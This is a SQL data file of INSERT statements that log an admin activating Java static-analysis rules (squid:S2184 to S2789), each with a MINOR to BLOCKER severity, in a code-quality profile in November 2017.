INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3389, '2017-11-20 12:51:25.4', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7pYbbGRdfPp-rSh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3390, '2017-11-20 12:51:25.411', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7pjbbGRdfPp-rSi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3391, '2017-11-20 12:51:25.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7pxbbGRdfPp-rSj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3392, '2017-11-20 12:51:25.442', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7qCbbGRdfPp-rSk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3393, '2017-11-20 12:51:25.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7qzbbGRdfPp-rSl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3394, '2017-11-20 12:51:25.522', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7rSbbGRdfPp-rSm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3395, '2017-11-20 12:51:25.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7rxbbGRdfPp-rSn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3396, '2017-11-20 12:51:25.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7sLbbGRdfPp-rSo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3397, '2017-11-20 12:51:25.605', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7slbbGRdfPp-rSp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3398, '2017-11-20 12:51:25.622', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7s2bbGRdfPp-rSq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3399, '2017-11-20 12:51:25.646', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7tObbGRdfPp-rSr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3400, '2017-11-20 12:51:25.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7tnbbGRdfPp-rSs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3401, '2017-11-20 12:51:25.688', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7t4bbGRdfPp-rSt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3402, '2017-11-20 12:51:25.712', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7uQbbGRdfPp-rSu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3403, '2017-11-20 12:51:25.737', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7upbbGRdfPp-rSv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3404, '2017-11-20 12:51:25.761', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7vBbbGRdfPp-rSw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3405, '2017-11-20 12:51:25.789', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7vdbbGRdfPp-rSx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3406, '2017-11-20 12:51:25.815', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7v3bbGRdfPp-rSy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3407, '2017-11-20 12:51:25.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7whbbGRdfPp-rSz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3408, '2017-11-20 12:51:25.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7xfbbGRdfPp-rS0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3409, '2017-11-20 12:51:25.975', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7yXbbGRdfPp-rS1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3410, '2017-11-20 12:51:26.04', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7zYbbGRdfPp-rS2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3411, '2017-11-20 12:51:26.215', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze72HbbGRdfPp-rS3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3412, '2017-11-20 12:51:26.278', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2274;ruleKey=squid:S2274;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze73GbbGRdfPp-rS4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3413, '2017-11-20 12:51:26.311', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2275;ruleKey=squid:S2275;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze73nbbGRdfPp-rS5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3414, '2017-11-20 12:51:26.375', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2276;ruleKey=squid:S2276;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze74nbbGRdfPp-rS6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3415, '2017-11-20 12:51:26.428', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2277;ruleKey=squid:S2277;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze75cbbGRdfPp-rS7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3416, '2017-11-20 12:51:26.475', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2278;ruleKey=squid:S2278;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze76LbbGRdfPp-rS8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3417, '2017-11-20 12:51:26.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2293;ruleKey=squid:S2293;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze762bbGRdfPp-rS9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3418, '2017-11-20 12:51:26.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2326;ruleKey=squid:S2326;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze77ZbbGRdfPp-rS-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3419, '2017-11-20 12:51:26.623', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2386;ruleKey=squid:S2386;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze78fbbGRdfPp-rS_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3420, '2017-11-20 12:51:26.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2387;ruleKey=squid:S2387;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze78_bbGRdfPp-rTA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3421, '2017-11-20 12:51:26.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2388;ruleKey=squid:S2388;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7-GbbGRdfPp-rTB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3422, '2017-11-20 12:51:26.764', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2390;ruleKey=squid:S2390;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7-sbbGRdfPp-rTC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3423, '2017-11-20 12:51:26.8', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2391;ruleKey=squid:S2391;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7_QbbGRdfPp-rTD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3424, '2017-11-20 12:51:26.852', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2437;ruleKey=squid:S2437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8AEbbGRdfPp-rTE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3425, '2017-11-20 12:51:26.913', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2438;ruleKey=squid:S2438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8BBbbGRdfPp-rTF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3426, '2017-11-20 12:51:26.966', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2440;ruleKey=squid:S2440;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8B2bbGRdfPp-rTG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3427, '2017-11-20 12:51:27.061', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2441;ruleKey=squid:S2441;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8DVbbGRdfPp-rTH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3428, '2017-11-20 12:51:27.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8E7bbGRdfPp-rTI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3429, '2017-11-20 12:51:27.373', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8INbbGRdfPp-rTJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3430, '2017-11-20 12:51:27.398', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8ImbbGRdfPp-rTK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3431, '2017-11-20 12:51:27.424', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8JAbbGRdfPp-rTL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3432, '2017-11-20 12:51:27.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8JUbbGRdfPp-rTM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3433, '2017-11-20 12:51:27.457', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8JhbbGRdfPp-rTN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3434, '2017-11-20 12:51:27.485', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8J9bbGRdfPp-rTO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3435, '2017-11-20 12:51:27.501', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8KNbbGRdfPp-rTP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3436, '2017-11-20 12:51:27.517', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8KcbbGRdfPp-rTQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3437, '2017-11-20 12:51:27.532', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8KsbbGRdfPp-rTR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3438, '2017-11-20 12:51:27.604', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8L0bbGRdfPp-rTS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3439, '2017-11-20 12:51:27.626', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8MKbbGRdfPp-rTT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3440, '2017-11-20 12:51:27.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8MabbGRdfPp-rTU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3441, '2017-11-20 12:51:27.658', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8MqbbGRdfPp-rTV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3442, '2017-11-20 12:51:27.673', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8M5bbGRdfPp-rTW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3443, '2017-11-20 12:51:27.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8NubbGRdfPp-rTX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3444, '2017-11-20 12:51:27.74', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8N8bbGRdfPp-rTY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3445, '2017-11-20 12:51:27.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8OMbbGRdfPp-rTZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3446, '2017-11-20 12:51:27.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8OqbbGRdfPp-rTa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3447, '2017-11-20 12:51:27.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8PMbbGRdfPp-rTb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3448, '2017-11-20 12:51:27.837', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8PdbbGRdfPp-rTc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3449, '2017-11-20 12:51:27.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8PpbbGRdfPp-rTd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3450, '2017-11-20 12:51:28.073', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8TJbbGRdfPp-rTe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3451, '2017-11-20 12:51:28.11', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze8TubbGRdfPp-rTf');
